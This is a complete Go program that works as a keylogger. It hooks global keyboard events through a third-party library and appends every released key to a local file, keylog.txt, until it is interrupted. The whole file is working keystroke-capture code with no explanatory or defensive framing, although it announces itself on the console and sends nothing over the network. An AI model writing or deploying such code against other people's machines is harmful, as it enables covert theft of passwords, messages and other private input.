package main

import (
	"fmt"
	"os"
	"os/signal"
	"syscall"

	"github.com/MichaelGatesDev/keyboard"
)

func main() {
	kb, err := keyboard.NewKeyboard()
	if err != nil {
		fmt.Printf("Failed to initialize keyboard listener: %v\n", err)
		return
	}
	file, err := os.Create("keylog.txt")
	if err != nil {
		fmt.Printf("Failed to create keylog file: %v\n", err)
		return
	}
	defer file.Close()
	err = kb.Start()
	if err != nil {
		fmt.Printf("Failed to start keyboard listener: %v\n", err)
		return
	}

	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-signalChan
		fmt.Println("\nStopping keylogger...")
		kb.Stop()
	}()
	fmt.Println("Keylogger started. Press Ctrl+C to stop.")
	for {
		event := <-kb.Events
		if event.Err != nil {
			fmt.Printf("Failed to read keyboard event: %v\n", event.Err)
			continue
		}
		if event.Kind == keyboard.KeyRelease {
			file.WriteString(fmt.Sprintf("%s\n", event.Key))
		}
	}
}
